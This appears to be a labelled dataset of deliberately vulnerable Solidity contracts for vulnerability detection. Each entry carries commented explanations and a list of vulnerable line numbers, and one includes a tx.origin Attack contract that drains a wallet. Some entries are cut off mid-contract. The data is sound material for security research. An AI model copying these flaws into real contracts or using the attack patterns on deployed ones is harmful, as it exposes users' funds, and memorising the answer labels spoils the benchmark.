        balanceOf[player] = 2000;
    }
    function _transfer(address to, uint256 value) internal {
        balanceOf[msg.sender] -= value;
        balanceOf[to] += value;
    }
    function transfer(address to, uint256 value) public {
        require(balanceOf[msg.sender] >= value);
        require(balanceOf[to] + value >= balanceOf[to]);
        _transfer(to, value);
    }
    function transferProxy(
        address _from,
        address _to,
        uint256 _value,
        uint256 _feeUgt,
        uint8 _v,
        bytes32 _r,
        bytes32 _s
    ) public returns (bool) {
        uint256 nonce = nonces[_from];
        bytes32 h = keccak256(
            abi.encodePacked(_from, _to, _value, _feeUgt, nonce)
        );
        if (_from != ecrecover(h, _v, _r, _s)) revert();
        if (
            balanceOf[_to] + _value < balanceOf[_to] ||
            balanceOf[msg.sender] + _feeUgt < balanceOf[msg.sender]
        ) revert();
        balanceOf[_to] += _value;
        balanceOf[msg.sender] += _feeUgt;
        balanceOf[_from] -= _value + _feeUgt;
        return true;
    }
}",[92]
"// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;
/*
We use NBA NFT incident as an example.
‘Association NFT’ collection by the NBA, which triggers the ‘Allow list’ to sell out permanently. 
This vulnerability could’ve allowed any malicious entity to mint several NFTs without paying any tokens. 
This contract fails to verify that a signature can be used only once.
*/
/*
 * @vulnerable_at_lines: 63, 96, 59
 */
interface INBA {
    struct vData {
        bool mint_free;
        uint256 max_mint;
        address from;
        uint256 start;
        uint256 end;
        uint256 eth_price;
        uint256 dust_price;
        bytes signature;
    }
    function mint_approved(
        vData memory info,
        uint256 number_of_items_requested,
        uint16 _batchNumber
    ) external;
}
contract NBA {
    uint16 public batchNumber;
    address signer = 0x669F499e7BA51836BB76F7dD2bc3C1A37a5342D7;
    struct vData {
        bool mint_free;
        uint256 max_mint;
        address from;
        uint256 start;
        uint256 end;
        uint256 eth_price;
        uint256 dust_price;
        bytes signature;
    }
    function mint_approved(
        vData memory info,
        uint256 number_of_items_requested,
        uint16 _batchNumber
    ) external view {
        require(batchNumber == _batchNumber, ""!batch"");
        // address from = msg.sender;
        require(verify(info), ""Unauthorised access secret""); // check whitelist
        //_mintCards(number_of_items_requested, from);
    }
    function verify(vData memory info) public view returns (bool) {
        require(info.from != address(0), ""INVALID_SIGNER"");
        bytes memory cat = abi.encode(
            info.from,
            info.start,
            info.end,
            info.eth_price,
            info.dust_price,
            info.max_mint,
            info.mint_free
        );
        // console.log(""data-->"");
        // console.logBytes(cat);
        bytes32 hash = keccak256(cat);
        // console.log(""hash ->"");
        //    console.logBytes32(hash);
        require(info.signature.length == 65, ""Invalid signature length"");
        bytes32 sigR;
        bytes32 sigS;
        uint8 sigV;
        bytes memory signature = info.signature;
        // ecrecover takes the signature parameters, and the only way to get them
        // currently is to use assembly.
        assembly {
            sigR := mload(add(signature, 0x20))
            sigS := mload(add(signature, 0x40))
            sigV := byte(0, mload(add(signature, 0x60)))
        }
        bytes32 data = keccak256(
            abi.encodePacked(""\x19Ethereum Signed Message:\n32"", hash)
        );
        address recovered = ecrecover(data, sigV, sigR, sigS);
        return signer == recovered;
    }
}","[49, 52, 84]"
"// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;
import ""@openzeppelin/contracts/proxy/transparent/TransparentUpgradeableProxy.sol"";
// We take Audius as an example. For more details, you can refer to Audius Governance Takeover Post-Mortem 7/23/22 and Remediation.
// https://blog.audius.co/article/audius-governance-takeover-post-mortem-7-23-22
/*
 * @vulnerable_at_lines: 28, 44
 */
interface ILogic {
    function getguardianAddress() external returns (address);
    function getproxyAdmin() external returns (address);
    function initialize(address) external;
    function getinitializing() external returns (bool);
    function getinitialized() external returns (bool);
    function isConstructor() external view returns (bool);
}
contract TestProxy is TransparentUpgradeableProxy {
    address private proxyAdmin; // slot 0 - storage collision here
    constructor(
        address _logic,
        address _admin,
        address guardianAddress
    )
        TransparentUpgradeableProxy(
            _logic,
            _admin,
            abi.encodeWithSelector(
                bytes4(0xc4d66de8), // bytes4(keccak256(""initialize(address)""))
                guardianAddress
            )
        )
    {
        proxyAdmin = _admin;
    }
}
contract Initializable {
    /**
     * @dev Indicates that the contract has been initialized.
     */
    bool private initialized;
    /**
     * @dev Indicates that the contract is in the process of being initialized.
     */
    bool private initializing;
    /**
     * @dev Modifier to use in the initializer function of a contract.
     */
    modifier initializer() {
        require(
            initializing || isConstructor() || !initialized,
            ""Contract instance has already been initialized""
        );
        bool isTopLevelCall = !initializing;
        if (isTopLevelCall) {
            initializing = true;
            initialized = true;
        }
        _;
        if (isTopLevelCall) {
            initializing = false;
        }
    }
    /// @dev Returns true if and only if the function is running in the constructor
    function isConstructor() private view returns (bool) {
        // extcodesize checks the size of the code stored in an address, and
        // address returns the current address. Since the code is still not
        // deployed when running a constructor, any checks on its code size will
        // yield zero, making it an effective way to detect if a contract is
        // under construction or not.
        address self = address(this);
        uint256 cs;
        assembly {
            cs := extcodesize(self)
        }
        return cs == 0;
    }
    // Reserved storage space to allow for layout changes in the future.
    uint256[50] private ______gap;
    function getinitializing() public view returns (bool) {
        return initializing;
    }
    function getinitialized() public view returns (bool) {
        return initialized;
    }
}
contract Logic is Initializable {
    address private guardianAddress;
    function initialize(address _guardianAddress) public initializer {
        guardianAddress = _guardianAddress; //Guardian address becomes the only party
    }
    function getguardianAddress() public view returns (address) {
        return guardianAddress;
    }
}","[18, 33]"
"// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;
/*
Name: Storage Collision Vulnerability
Description:
The vulnerability is that both the Proxy and Logic contracts use the same storage slot (slot 0) to store important variables,
namely the implementation address in the Proxy contract and the GuestAddress in the Logic contract. 
Since the Proxy contract is using the delegatecall method to interact with the Logic contract, 
they share the same storage. If the foo function is called,
it overwrites the implementation address in the Proxy contract, which results in an unexpected behavior.
Mitigation:
One approach to mitigating this issue is to design the storage layout of the proxy and logic contracts to be consistent with each other.
REF:
https://blog.openzeppelin.com/proxy-patterns
*/
/*
 * @vulnerable_at_lines: 26, 41
 */
contract Proxy {
    address public implementation; //slot0
    constructor(address _implementation) {
        implementation = _implementation;
    }
    function testcollision() public {
        bool success;
        (success, ) = implementation.delegatecall(
            abi.encodeWithSignature(""foo(address)"", address(this))
        );
    }
}
contract Logic {
    address public GuestAddress; //slot0
    constructor() {
        GuestAddress = address(0x0);
    }
    function foo(address _addr) public {
        GuestAddress = _addr;
    }
}","[20, 32]"
"// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;
/*
Name: Struct Deletion Oversight
Description:
Incomplete struct deletion leaves residual data. 
If you delete a struct containing a mapping, the mapping won't be deleted.
The bug arises because Solidity's delete keyword does not reset the storage to its 
initial state but rather performs a partial reset. 
When delete  myStructs[structId] is called, 
it only resets the id at mappingId to its default value 0, 
but the other flags in the mapping remain unchanged. Therefore,
if the struct is deleted without deleting the mapping inside, 
the remaining flags will persist in storage.
Mitigation:  
To fix this bug, you should delete the mapping inside the struct before deleting the struct itself.
REF:
https://twitter.com/1nf0s3cpt/status/1676836264245592065
https://docs.soliditylang.org/en/develop/types.html
*/
/*
 * @vulnerable_at_lines: 56
 */
contract StructDeletionBug {
    struct MyStruct {
        uint256 id;
        mapping(uint256 => bool) flags;
    }
    mapping(uint256 => MyStruct) public myStructs;
    function addStruct(uint256 structId, uint256 flagKeys) public {
        MyStruct storage newStruct = myStructs[structId];
        newStruct.id = structId;
        newStruct.flags[flagKeys] = true;
    }
    function getStruct(
        uint256 structId,
        uint256 flagKeys
    ) public view returns (uint256, bool) {
        MyStruct storage myStruct = myStructs[structId];
        bool keys = myStruct.flags[flagKeys];
        return (myStruct.id, keys);
    }
    function deleteStruct(uint256 structId) public {
        MyStruct storage myStruct = myStructs[structId];
        delete myStructs[structId];
    }
}
contract FixedStructDeletion {
    struct MyStruct {
        uint256 id;
        mapping(uint256 => bool) flags;
    }
    mapping(uint256 => MyStruct) public myStructs;
    function addStruct(uint256 structId, uint256 flagKeys) public {
        MyStruct storage newStruct = myStructs[structId];
        newStruct.id = structId;
        newStruct.flags[flagKeys] = true;
    }
    function getStruct(
        uint256 structId,
        uint256 flagKeys
    ) public view returns (uint256, bool) {
        MyStruct storage myStruct = myStructs[structId];
        bool keys = myStruct.flags[flagKeys];
        return (myStruct.id, keys);
    }
    function deleteStruct(uint256 structId) public {
        MyStruct storage myStruct = myStructs[structId];
        // Check if all flags are deleted, then delete the mapping
        for (uint256 i = 0; i < 15; i++) {
            delete myStruct.flags[i];
        }
        delete myStructs[structId];
    }
}",[45]
"// SPDX-License-Identifier: MIT
pragma solidity ^0.8.15;
/*
Name: Insecure tx.origin Vulnerability
Description:
tx.origin is a global variable in Solidity; using this variable for authentication in 
a smart contract makes the contract vulnerable to phishing attacks.
Scenario:
Wallet is a simple contract where only the owner should be able to transfer
Ether to another address. Wallet.transfer() uses tx.origin to check that the
caller is the owner. Let's see how we can hack this contract
What happened?
Alice was tricked into calling Attack.attack(). Inside Attack.attack(), it
requested a transfer of all funds in Alice's wallet to Eve's address.
Since tx.origin in Wallet.transfer() is equal to Alice's address,
it authorized the transfer. The wallet transferred all Ether to Eve.
Mitigation:
It is advisable to use msg.sender.
REF:
https://hackernoon.com/hacking-solidity-contracts-using-txorigin-for-authorization-are-vulnerable-to-phishing
*/
/*
 * @vulnerable_at_lines: 42
 */
contract Wallet {
    address public owner;
    constructor() payable {
        owner = msg.sender;
    }
    function transfer(address payable _to, uint _amount) public {
        // check with msg.sender instead of tx.origin
        require(tx.origin == owner, ""Not owner"");
        (bool sent, ) = _to.call{value: _amount}("""");
        require(sent, ""Failed to send Ether"");
    }
}
contract Attack {
    address payable public owner;
    Wallet wallet;
    constructor(Wallet _wallet) {
        wallet = Wallet(_wallet);
        owner = payable(msg.sender);
    }
    function attack() public {
        wallet.transfer(owner, address(wallet).balance);
    }
}",[32]
"// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;
import ""@openzeppelin/contracts/utils/Address.sol"";
import ""@openzeppelin/contracts/proxy/utils/Initializable.sol"";
/*
Name: Uninitialized variable Vulnerability
Description:
Uninitialized local storage variables may contain the value of other storage variables in the contract;
this fact can cause unintentional vulnerabilities, or be exploited deliberately.
REF:
https://blog.dixitaditya.com/ethernaut-level-25-motorbike
*/
/*
 * @vulnerable_at_lines: 89, 98, 38, 39, 40, 96
 */
contract Motorbike {
    // keccak-256 hash of ""eip1967.proxy.implementation"" subtracted by 1
    bytes32 internal constant _IMPLEMENTATION_SLOT =
        0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
    struct AddressSlot {
        address value;
    }
    // Initializes the upgradeable proxy with an initial implementation specified by `_logic`.
    constructor(address _logic) {
        require(
            Address.isContract(_logic),
            ""ERC1967: new implementation is not a contract""
        );
        _getAddressSlot(_IMPLEMENTATION_SLOT).value = _logic;
        (bool success, ) = _logic.delegatecall(
            abi.encodeWithSignature(""initialize()"")
        );
        require(success, ""Call failed"");
    }
    // Delegates the current call to `implementation`.
    function _delegate(address implementation) internal virtual {
        // solhint-disable-next-line no-inline-assembly
        assembly {
            calldatacopy(0, 0, calldatasize())
            let result := delegatecall(
                gas(),
                implementation,
                0,
                calldatasize(),
                0,
                0
            )
            returndatacopy(0, 0, returndatasize())
            switch result
            case 0 {
                revert(0, returndatasize())
            }
            default {
                return(0, returndatasize())
            }
        }
    }
    // Fallback function that delegates calls to the address returned by `_implementation()`.
    // Will run if no other function in the contract matches the call data
    fallback() external payable virtual {
        _delegate(_getAddressSlot(_IMPLEMENTATION_SLOT).value);
    }
    // Returns an `AddressSlot` with member `value` located at `slot`.
    function _getAddressSlot(
        bytes32 slot
    ) internal pure returns (AddressSlot storage r) {
        assembly {
            r.slot := slot
        }
    }
}
contract Engine is Initializable {
    // keccak-256 hash of ""eip1967.proxy.implementation"" subtracted by 1
    bytes32 internal constant _IMPLEMENTATION_SLOT =
        0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
    address public upgrader;
    uint256 public horsePower;
    struct AddressSlot {
        address value;
    }
    function initialize() external initializer {
        horsePower = 1000;
        upgrader = msg.sender;
    }
    // Upgrade the implementation of the proxy to `newImplementation`
    // subsequently execute the function call
    function upgradeToAndCall(
        address newImplementation,
        bytes memory data
    ) external payable {
        _authorizeUpgrade();
        _upgradeToAndCall(newImplementation, data);
    }
    // Restrict to upgrader role
    function _authorizeUpgrade() internal view {
        require(msg.sender == upgrader, ""Can't upgrade"");
    }
    // Perform implementation upgrade with security checks for UUPS proxies, and additional setup call.
    function _upgradeToAndCall(
        address newImplementation,
        bytes memory data
    ) internal {
        // Initial upgrade and setup call
        _setImplementation(newImplementation);
        if (data.length > 0) {
            (bool success, ) = newImplementation.delegatecall(data);
            require(success, ""Call failed"");
        }
    }
    event Returny(uint256);
    function greetMe() public {
        emit Returny(0x42);
    }
    // Stores a new address in the EIP1967 implementation slot.
    function _setImplementation(address newImplementation) private {
        require(
            Address.isContract(newImplementation),
            ""ERC1967: new implementation is not a contract""
        );
        AddressSlot storage r;","[30, 31, 32, 76, 81, 83]"
"// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;
import ""@openzeppelin/contracts/token/ERC721/extensions/ERC721Enumerable.sol"";
/*
Name: Unprotected callback - ERC721 SafeMint reentrancy
Description:
The contract ContractTest is exploiting a callback feature to bypass the maximum mint limit 
set by the MaxMint721 contract. This is achieved by triggering the onERC721Received function,
which internally calls the mint function again. Therefore, although MaxMint721 attempts 
to limit the number of tokens that a user can mint to MAX_PER_USER, the ContractTest contract 
successfully mints more tokens than this limit. 
Scenario:
This excersise is about a contract that via callback function to mint more NFTs
Mitigation:
Follow check-effect-interaction and use OpenZeppelin Reentrancy Guard.
REF
https://blocksecteam.medium.com/when-safemint-becomes-unsafe-lessons-from-the-hypebears-security-incident-2965209bda2a
https://www.paradigm.xyz/2021/08/the-dangers-of-surprising-code
*/
/*
 * @vulnerable_at_lines: 44
 */
contract MaxMint721 is ERC721Enumerable {
    uint256 public MAX_PER_USER = 10;
    constructor() ERC721(""ERC721"", ""ERC721"") {}
    function mint(uint256 amount) external {
        require(
            balanceOf(msg.sender) + amount <= MAX_PER_USER,
            ""exceed max per user""
        );
        for (uint256 i = 0; i < amount; i++) {
            uint256 mintIndex = totalSupply();
            _safeMint(msg.sender, mintIndex);
        }
    }
}",[33]
"// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;
// Import the SafeCast library
import ""@openzeppelin/contracts/utils/math/SafeCast.sol"";
/*
Name: Unsafe downcasting
Description:
Downcasting from a larger integer type to a smaller one without checks can lead to unexpected behavior 
if the value of the larger integer is outside the range of the smaller one.
Mitigation:  
Make sure consistent uint256, or use openzepplin safeCasting.
REF:
https://twitter.com/1nf0s3cpt/status/1673511868839886849
https://github.com/code-423n4/2022-12-escher-findings/issues/369
https://github.com/sherlock-audit/2022-10-union-finance-judging/issues/96
*/
/*
 * @vulnerable_at_lines: 34
 */
contract SimpleBank {
    mapping(address => uint) private balances;
    function deposit(uint256 amount) public {
        // Here's the unsafe downcast. If the `amount` is greater than type(uint8).max
        // (which is 255), then only the least significant 8 bits are stored in balance.
        // This could lead to unexpected results due to overflow.
        uint8 balance = uint8(amount);
        // store the balance
        balances[msg.sender] = balance;
    }
    function getBalance() public view returns (uint) {
        return balances[msg.sender];
    }
}
contract FixedSimpleBank {
    using SafeCast for uint256; // Use SafeCast for uint256
    mapping(address => uint) private balances;
    function deposit(uint256 _amount) public {
        // Use the `toUint8()` function from `SafeCast` to safely downcast `amount`.
        // If `amount` is greater than `type(uint8).max`, it will revert.
        // or keep the same uint256 with amount.
        uint8 amount = _amount.toUint8(); // or keep uint256
        // Store the balance
        balances[msg.sender] = amount;
    }
    function getBalance() public view returns (uint) {
        return balances[msg.sender];
    }
}",[26]
"// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;
/*
Name: Unsafe Call Vulnerability
Description:
In TokenWhale contract's approveAndCallcode function. The vulnerability allows an 
arbitrary call to be executed with arbitrary data, leading to potential security risks
and unintended consequences. The function uses a low-level call (_spender.call(_extraData))
to execute code from the _spender address without any validation or checks on the provided _extraData.
This can lead to unexpected behavior, reentrancy attacks, or unauthorized operations.
This excersise is about  a low level call to a contract where input and return values are not checked
If the call data is controllable, it is easy to cause arbitrary function execution.
Mitigation:
Use of low level ""call"" should be avoided whenever possible.  
REF
https://blog.li.fi/20th-march-the-exploit-e9e1c5c03eb9
*/
/*
 * @vulnerable_at_lines: 96
 */
contract TokenWhale {
    address player;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    string public name = ""Simple ERC20 Token"";
    string public symbol = ""SET"";
    uint8 public decimals = 18;
    function TokenWhaleDeploy(address _player) public {
        player = _player;
        totalSupply = 1000;
        balanceOf[player] = 1000;
    }
    function isComplete() public view returns (bool) {
        return balanceOf[player] >= 1000000; // 1 mil
    }
    event Transfer(address indexed from, address indexed to, uint256 value);
    function _transfer(address to, uint256 value) internal {
        balanceOf[msg.sender] -= value;
        balanceOf[to] += value;
        emit Transfer(msg.sender, to, value);
    }
    function transfer(address to, uint256 value) public {
        require(balanceOf[msg.sender] >= value);
        require(balanceOf[to] + value >= balanceOf[to]);
        _transfer(to, value);
    }
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
    function approve(address spender, uint256 value) public {
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
    }
    function transferFrom(address from, address to, uint256 value) public {
        require(balanceOf[from] >= value);
        require(balanceOf[to] + value >= balanceOf[to]);
        require(allowance[from][msg.sender] >= value);
        allowance[from][msg.sender] -= value;
        _transfer(to, value);
    }
    /* Approves and then calls the contract code*/
    function approveAndCallcode(
        address _spender,
        uint256 _value,
        bytes memory _extraData
    ) public {
        allowance[msg.sender][_spender] = _value;
        bool success;
        // vulnerable call execute unsafe user code
        (success, ) = _spender.call(_extraData);
    }
}",[73]
"// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;
/*
Name: Improper Access Control Vulnerability
Description:
The default visibility of the function is Public. 
If there is an unsafe visibility setting, the attacker can directly call the sensitive function in the smart contract.
The ownerGame contract has a changeOwner function that is intended to change the owner of the contract.
However, due to improper access control, this function is publicly accessible and 
can be called by any external account or contract. As a result, an attacker can call this function
to change the ownership of the contract and take control.
Impact: the owner of the contract can be changed by anyone.
Mitigation:
Use access control modifiers: Solidity provides modifiers, such as onlyOwner, 
which can be used to restrict the access of functions
*/
/*
 * @vulnerable_at_lines: 36, 37, 38
 */
contract ownerGame {
    address public owner;
    constructor() {
        owner = msg.sender;
    }
    // wrong visibility of changeOwner function should be onlyOwner
    function changeOwner(address _new) public {
        owner = _new;
    }
}","[26, 27, 28]"
"/*
 * @source: https://smartcontractsecurity.github.io/SWC-registry/docs/SWC-124#arbitrary-location-write-simplesol
 * @author: Suhabe Bugrara
 * @vulnerable_at_lines: 27
 */
 pragma solidity ^0.4.25;
 contract Wallet {
     uint[] private bonusCodes;
     address private owner;
     constructor() public {
         bonusCodes = new uint[](0);
         owner = msg.sender;
     }
     function () public payable {
     }
     function PushBonusCode(uint c) public {
         bonusCodes.push(c);
     }
     function PopBonusCode() public {
         // <yes> <report> ACCESS_CONTROL
         require(0 <= bonusCodes.length); // this condition is always true since array lengths are unsigned
         bonusCodes.length--; // an underflow can be caused here
     }
     function UpdateBonusCodeAt(uint idx, uint c) public {
         require(idx < bonusCodes.length);
         bonusCodes[idx] = c; // write to any index less than bonusCodes.length
     }
     function Destroy() public {
         require(msg.sender == owner);
         selfdestruct(msg.sender);
     }
 }",[21]
"/*
 * @source: https://github.com/sigp/solidity-security-blog
 * @author: Suhabe Bugrara
 * @vulnerable_at_lines: 31,38
 */
//added pragma version
pragma solidity ^0.4.22;
contract FibonacciBalance {
    address public fibonacciLibrary;
    // the current fibonacci number to withdraw
    uint public calculatedFibNumber;
    // the starting fibonacci sequence number
    uint public start = 3;
    uint public withdrawalCounter;
    // the fibonancci function selector
    bytes4 constant fibSig = bytes4(sha3(""setFibonacci(uint256)""));
    // constructor - loads the contract with ether
    constructor(address _fibonacciLibrary) public payable {
        fibonacciLibrary = _fibonacciLibrary;
    }
    function withdraw() {
        withdrawalCounter += 1;
        // calculate the fibonacci number for the current withdrawal user
        // this sets calculatedFibNumber
        // <yes> <report> ACCESS_CONTROL
        require(fibonacciLibrary.delegatecall(fibSig, withdrawalCounter));
        msg.sender.transfer(calculatedFibNumber * 1 ether);
    }
    // allow users to call fibonacci library functions
    function() public {
        // <yes> <report> ACCESS_CONTROL
        require(fibonacciLibrary.delegatecall(msg.data));
    }
}
// library contract - calculates fibonacci-like numbers;
contract FibonacciLib {
    // initializing the standard fibonacci sequence;
    uint public start;
    uint public calculatedFibNumber;
    // modify the zeroth number in the sequence
    function setStart(uint _start) public {
        start = _start;
    }
    function setFibonacci(uint n) public {
        calculatedFibNumber = fibonacci(n);
    }
    function fibonacci(uint n) internal returns (uint) {
        if (n == 0) return start;
        else if (n == 1) return start + 1;
        else return fibonacci(n - 1) + fibonacci(n - 2);
    }
}","[26, 32]"
"/*
 * @source: https://github.com/trailofbits/not-so-smart-contracts/blob/master/wrong_constructor_name/incorrect_constructor.sol
 * @author: Ben Perez
 * @vulnerable_at_lines: 20
 */
pragma solidity ^0.4.24;
contract Missing{
    address private owner;
    modifier onlyowner {
        require(msg.sender==owner);
        _;
    }
    // The name of the constructor should be Missing
    // Anyone can call the IamMissing once the contract is deployed
    // <yes> <report> ACCESS_CONTROL
    function IamMissing()
        public
    {
        owner = msg.sender;
    }
    function () payable {}
    function withdraw()
        public
        onlyowner
    {
       owner.transfer(this.balance);
    }
}",[16]
"/*
 * @source: https://smartcontractsecurity.github.io/SWC-registry/docs/SWC-118#incorrect-constructor-name1sol
 * @author: Ben Perez
 * @vulnerable_at_lines: 18
 */
pragma solidity ^0.4.24;
contract Missing{
    address private owner;
    modifier onlyowner {
        require(msg.sender==owner);
        _;
    }
    // <yes> <report> ACCESS_CONTROL
    function missing()
        public
    {
        owner = msg.sender;
    }
    function () payable {}
    function withdraw()
        public
        onlyowner
    {
       owner.transfer(this.balance);
    }
}",[14]
"/*
 * @source: https://smartcontractsecurity.github.io/SWC-registry/docs/SWC-118#incorrect-constructor-name2sol
 * @author: Ben Perez
 * @vulnerable_at_lines: 17
 */
pragma solidity ^0.4.24;
contract Missing{
    address private owner;
    modifier onlyowner {
        require(msg.sender==owner);
        _;
    }
    // <yes> <report> ACCESS_CONTROL
    function Constructor()
        public
    {
        owner = msg.sender;
    }
    function () payable {}
    function withdraw()
        public
        onlyowner
    {
       owner.transfer(this.balance);
    }
}",[14]
"/*
 * @source: https://smartcontractsecurity.github.io/SWC-registry/docs/SWC-124#mapping-writesol
 * @author: Suhabe Bugrara
 * @vulnerable_at_lines: 20
 */
 pragma solidity ^0.4.24;
 //This code is derived from the Capture the Ether https://capturetheether.com/challenges/math/mapping/
 contract Map {
     address public owner;
     uint256[] map;
     function set(uint256 key, uint256 value) public {
         if (map.length <= key) {
             map.length = key + 1;
         }
        // <yes> <report> ACCESS_CONTROL
         map[key] = value;
     }
     function get(uint256 key) public view returns (uint256) {
         return map[key];
     }
     function withdraw() public{
       require(msg.sender == owner);
       msg.sender.transfer(address(this).balance);
     }
 }",[16]
"/*
 * @source: https://github.com/SmartContractSecurity/SWC-registry/blob/master/test_cases/solidity/unprotected_critical_functions/multiowned_vulnerable/multiowned_vulnerable.sol
 * @author: -
 * @vulnerable_at_lines: 38
 */
pragma solidity ^0.4.23;
/**
 * @title MultiOwnable
 */
contract MultiOwnable {
  address public root;
  mapping (address => address) public owners; // owner => parent of owner
  /**
  * @dev The Ownable constructor sets the original `owner` of the contract to the sender
  * account.
  */
  constructor() public {
    root = msg.sender;
    owners[root] = root;
  }
  /**
  * @dev Throws if called by any account other than the owner.
  */
  modifier onlyOwner() {
    require(owners[msg.sender] != 0);
    _;
  }
  /**
  * @dev Adding new owners
  * Note that the ""onlyOwner"" modifier is missing here.
  */
  // <yes> <report> ACCESS_CONTROL
  function newOwner(address _owner) external returns (bool) {
    require(_owner != 0);
    owners[_owner] = msg.sender;
    return true;
  }
  /**
    * @dev Deleting owners
    */
  function deleteOwner(address _owner) onlyOwner external returns (bool) {
    require(owners[_owner] == msg.sender || (owners[_owner] != 0 && msg.sender == root));
    owners[_owner] = 0;
    return true;
  }
}
contract TestContract is MultiOwnable {
  function withdrawAll() onlyOwner {
    msg.sender.transfer(this.balance);
  }
  function() payable {
  }
}",[33]
"/*
 * @source: https://consensys.github.io/smart-contract-best-practices/recommendations/#avoid-using-txorigin
 * @author: Consensys Diligence
 * @vulnerable_at_lines: 20
 * Modified by Gerhard Wagner
 */
pragma solidity ^0.4.24;
contract MyContract {
    address owner;
    function MyContract() public {
        owner = msg.sender;
    }
    function sendTo(address receiver, uint amount) public {
        // <yes> <report> ACCESS_CONTROL
        require(tx.origin == owner);
        receiver.transfer(amount);
    }
}",[15]
"    clearPending();
    if (m_numOwners >= c_maxOwners)
      reorganizeOwners();
    if (m_numOwners >= c_maxOwners)
      return;
    m_numOwners++;
    m_owners[m_numOwners] = uint(_owner);
    m_ownerIndex[uint(_owner)] = m_numOwners;
    OwnerAdded(_owner);
  }
  function removeOwner(address _owner) onlymanyowners(sha3(msg.data)) external {
    uint ownerIndex = m_ownerIndex[uint(_owner)];
    if (ownerIndex == 0) return;
    if (m_required > m_numOwners - 1) return;
    m_owners[ownerIndex] = 0;
    m_ownerIndex[uint(_owner)] = 0;
    clearPending();
    reorganizeOwners(); //make sure m_numOwner is equal to the number of owners and always points to the optimal free slot
    OwnerRemoved(_owner);
  }
  function changeRequirement(uint _newRequired) onlymanyowners(sha3(msg.data)) external {
    if (_newRequired > m_numOwners) return;
    m_required = _newRequired;
    clearPending();
    RequirementChanged(_newRequired);
  }
  // Gets an owner by 0-indexed position (using numOwners as the count)
  function getOwner(uint ownerIndex) external constant returns (address) {
    return address(m_owners[ownerIndex + 1]);
  }
  function isOwner(address _addr) constant returns (bool) {
    return m_ownerIndex[uint(_addr)] > 0;
  }
  function hasConfirmed(bytes32 _operation, address _owner) external constant returns (bool) {
    var pending = m_pending[_operation];
    uint ownerIndex = m_ownerIndex[uint(_owner)];
    // make sure they're an owner
    if (ownerIndex == 0) return false;
    // determine the bit to set for this owner.
    uint ownerIndexBit = 2**ownerIndex;
    return !(pending.ownersDone & ownerIndexBit == 0);
  }
  // constructor - stores initial daily limit and records the present day's index.
  function initDaylimit(uint _limit) only_uninitialized {
    m_dailyLimit = _limit;
    m_lastDay = today();
  }
  // (re)sets the daily limit. needs many of the owners to confirm. doesn't alter the amount already spent today.
  function setDailyLimit(uint _newLimit) onlymanyowners(sha3(msg.data)) external {
    m_dailyLimit = _newLimit;
  }
  // resets the amount already spent today. needs many of the owners to confirm.
  function resetSpentToday() onlymanyowners(sha3(msg.data)) external {
    m_spentToday = 0;
  }
  // throw unless the contract is not yet initialized.
  modifier only_uninitialized { if (m_numOwners > 0) throw; _; }
  // constructor - just pass on the owner array to the multiowned and
  // the limit to daylimit
  // <yes> <report> ACCESS_CONTROL
  function initWallet(address[] _owners, uint _required, uint _daylimit) only_uninitialized {
    initDaylimit(_daylimit);
    initMultiowned(_owners, _required);
  }
  // kills the contract sending everything to `_to`.
  // <yes> <report> ACCESS_CONTROL
  function kill(address _to) onlymanyowners(sha3(msg.data)) external {
    suicide(_to);
  }
  // Outside-visible transact entry point. Executes transaction immediately if below daily spend limit.
  // If not, goes into multisig process. We provide a hash on return to allow the sender to provide
  // shortcuts for the other confirmations (allowing them to avoid replicating the _to, _value
  // and _data arguments). They still get the option of using them if they want, anyways.
  function execute(address _to, uint _value, bytes _data) external onlyowner returns (bytes32 o_hash) {
    // first, take the opportunity to check that we're under the daily limit.
    if ((_data.length == 0 && underLimit(_value)) || m_required == 1) {
      // yes - just execute the call.
      address created;
      if (_to == 0) {
        created = create(_value, _data);
      } else {
        if (!_to.call.value(_value)(_data))
          throw;
      }
      SingleTransact(msg.sender, _value, _to, _data, created);
    } else {
      // determine our operation hash.
      o_hash = sha3(msg.data, block.number);
      // store if it's new
      if (m_txs[o_hash].to == 0 && m_txs[o_hash].value == 0 && m_txs[o_hash].data.length == 0) {
        m_txs[o_hash].to = _to;
        m_txs[o_hash].value = _value;
        m_txs[o_hash].data = _data;
      }
      if (!confirm(o_hash)) {
        ConfirmationNeeded(o_hash, msg.sender, _value, _to, _data);
      }
    }
  }
  function create(uint _value, bytes _code) internal returns (address o_addr) {
    /*
    assembly {
      o_addr := create(_value, add(_code, 0x20), mload(_code))
      jumpi(invalidJumpLabel, iszero(extcodesize(o_addr)))
    }
    */
  }
  // confirm a transaction through just the hash. we use the previous transactions map, m_txs, in order
  // to determine the body of the transaction from the hash provided.
  function confirm(bytes32 _h) onlymanyowners(_h) returns (bool o_success) {
    if (m_txs[_h].to != 0 || m_txs[_h].value != 0 || m_txs[_h].data.length != 0) {
      address created;
      if (m_txs[_h].to == 0) {
        created = create(m_txs[_h].value, m_txs[_h].data);
      } else {
        if (!m_txs[_h].to.call.value(m_txs[_h].value)(m_txs[_h].data))
          throw;
      }
      MultiTransact(msg.sender, _h, m_txs[_h].value, m_txs[_h].to, m_txs[_h].data, created);
      delete m_txs[_h];
      return true;
    }
  }
  // INTERNAL METHODS
  function confirmAndCheck(bytes32 _operation) internal returns (bool) {
    // determine what index the present sender is:
    uint ownerIndex = m_ownerIndex[uint(msg.sender)];
    // make sure they're an owner","[61, 67]"
"/*
 * @source: https://github.com/sigp/solidity-security-blog
 * @author: -
 * @vulnerable_at_lines: 20
 */
 pragma solidity ^0.4.22;
 contract Phishable {
    address public owner;
    constructor (address _owner) {
        owner = _owner;
    }
    function () public payable {} // collect ether
    function withdrawAll(address _recipient) public {
        // <yes> <report> ACCESS_CONTROL
